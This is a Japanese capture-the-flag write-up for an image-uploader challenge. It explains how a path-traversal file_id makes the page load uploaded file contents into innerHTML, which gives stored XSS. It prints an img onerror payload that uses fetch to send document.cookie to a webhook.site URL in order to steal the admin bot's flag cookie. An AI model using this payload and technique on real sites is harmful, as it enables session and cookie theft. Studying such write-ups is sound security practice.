# Small Image Uploader

## / Overview

ディレクトリトラバーサルを用いたinnerHTMLへのリダイレクト埋め込み

## / Writeup

Admin Bot 系の問題です．Botは指定したページに，フラグをクッキーとして保持した状態で訪問します．これを外部のサーバーに送信するというのが定石です．

今回も Bot から[Webhook](https://webhook.site)で立てたサーバをにリダイレクトさせることを目的とします．

脆弱性の探索として配布ファイルの静的解析をするのもいいですが，一度正規のユーザーとして画像のアップロードをテストしてみました．アップロード先のURLを開くと**画像とファイル名**が表示されたのでファイル名を変えられたらXSSできそうです．

なのでまずはファイルをアップロードする時に，ファイル名にスクリプトタグを含めようと試みました．しかし`app.py`を見るときちんとエスケープ処理が施されているため違う案を考えます．

```py
@app.post("/api/upload")
def upload():
    file = request.files.get("file")

    if not file:
        return jsonify({"error": "Please upload a file"}), 400
    
    _, ext = os.path.splitext(file.filename)
    if ext not in [".png", ".jpg", ".jpeg", ".gif"]:
        return jsonify({"error": "Invalid extension"}), 400
    
    _, original_filename = os.path.split(file.filename)
    file_id = str(uuid.uuid4())
    path = f"./uploads/{file_id}{ext}"
    file_infos[file_id] = {
        "original_filename": html.escape(original_filename), # エスケープ処理されている
        "path": path
    }
    file.save(path)

    return jsonify({"success": True, "file_id": file_id})
```

次に，アップロード先のページのソースコードである`file.html`を見てみます．ファイル名は以下のスクリプトタグによって動的に決定されていました．

```html
<script>
    const params = new URLSearchParams(window.location.search);
    const fileId = params.get("file_id");
    const previewEl = document.getElementById("preview");
    const filenameEl = document.getElementById("filename");
    const errorEl = document.getElementById("error");

    if (!fileId) {
    errorEl.textContent = "Missing file_id.";
    errorEl.hidden = false;
    } else {
    previewEl.src = `/api/file/${fileId}`;
    fetch(`/api/filename/${fileId}`) // ファイル名の処理
        .then((res) => (res.ok ? res.text() : null))
        .then((data) => {
        filenameEl.innerHTML = `<i>Filename: ${data}</i>`;
        });
    }
</script>
```

ファイル名の表示は`/api/filename/${fileId}`からデータを取得後，テキストに変換され，innerHTMLとして直接ページに埋め込まれます．

これを見て気になるのが`/api/filename/${fileId}`という処理です．`fileId`はユーザがURLのクエリストリングで指定できる任意文字列なので，`/api/filename/${fileId}`はディレクトリトラバーサルの典型的な脆弱性があります．これを悪用したいと考えます．具体的にはファイルの中身をXSSのペイロードにします．

どういうことかと言うと，まず適当な名前のテキストファイル`attack.txt`を作成します．これに以下のようなペイロードを書き込みます．

```html
<img src="/x" onerror="alert('hi');">
```

これは`/x`という画像がなければ，onerrorの中身`alert('hi')`を実行するというタグです．書き込んだら保存して，`attack.png`に名前を変えます．

次にWebサイトで`attack.png`をアップロードしてURLにアクセスします．この時URLは

```
http://34.170.146.252:9120/file?file_id=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

のような見た目をしているはずです．これを以下のようなURLに書き換えます．

```
http://34.170.146.252:9120/file?file_id=../file/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

この時，ファイル名は`/api/filename/../file/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`から取ってきます．つまりファイルの中身を管理するAPIからファイル名を取ってきます．

これにより`<i>Filename: <img src="/x" onerror="alert('hi');"></i>`がinnerHTMLでページに挿入され，アラートが画面上部に表示されます．

あとは埋め込むタグを

```html
<img src="/x" onerror="fetch('https://webhook.site/<自分のURL>?cookie='+document.cookie)">
```

に変えて，再度同じ手順を踏みます． Admin Bot に`file?file_id=../file/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`を Submit すると，待ち受けているサーバーにクッキー情報が送信されてフラグを得ることができます．